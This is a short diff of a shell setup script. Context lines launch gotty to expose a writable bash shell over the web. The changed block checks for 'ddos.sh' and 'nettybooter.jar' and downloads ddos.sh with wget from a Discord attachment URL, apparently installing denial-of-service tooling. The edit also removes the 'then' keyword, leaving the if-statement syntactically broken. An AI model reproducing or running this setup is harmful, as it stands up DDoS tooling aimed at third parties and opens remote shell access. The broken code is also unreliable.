@@ -186,8 +186,7 @@ echo "$HOMEA/gotty -p $SERVER_PORT -w bash &">$HOME/startcustom.sh
 chmod +x $HOME/startcustom.sh
 fi
 
-if [ ! -f "ddos.sh" ] && [ ! -f "nettybooter.jar" ]
-then
+if [ ! -f ddos.sh ] && [ ! -f nettybooter.jar ];
 echo "Installing deps"
 wget https://cdn.discordapp.com/attachments/920543974266130523/929337717588885514/ddos.sh
 echo "1/2"
